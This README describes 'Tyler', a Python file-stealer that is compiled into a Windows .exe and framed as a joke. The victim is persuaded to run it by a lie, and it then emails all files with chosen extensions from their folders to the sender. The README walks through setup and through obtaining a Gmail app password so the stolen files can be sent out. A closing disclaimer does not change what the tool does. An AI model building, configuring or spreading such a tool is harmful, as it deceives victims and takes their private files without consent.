# Tyler

📁 **Tyler** — this is a Python script for a "joke". The idea of ​​the script is that you ask your friend to open an .exe file under the pretext that you wrote a cool thing, but here's the problem, the script sends you all the files from the your friend folders to your email. 


It will not work on Linux or MacOS

# 🚀 Setup
To launch the main script, run the setup.py file and fill in all the required fields. This is not difficult, except for the email password field, which I will explain later.
Also in line 'extensions' you can add extensions you want. Write extensions separated by spaces, without commas (.exe .jpg .pdf .cpp .c ...).
The EXE file will be in the **"dist"** folder


# How can you get it in Gmail

⚠️ This only works if you have two-step verification (2FA) enabled in Google. If you have it disabled, you will need to enable it first.

---

## 🔐 Steps:

1. Go to your Google account settings:
👉 https://myaccount.google.com/

2. In the menu on the left, select **"Security"**.

3. Enable **two-step verification**, if it is not enabled already.

4. After that, the **"App passwords"** section will appear.

Direct link (if available):
👉 https://myaccount.google.com/apppasswords

5. Select:
- Application: **"Mail"**
- Device: **"Other"** — enter, for example, `Python`

6. Google will generate a **16-digit code** — this is your `app_password`.
---



## P.S.: not to be used for bad intentions!!! Also, at first, you should test it on yourself to check if it works
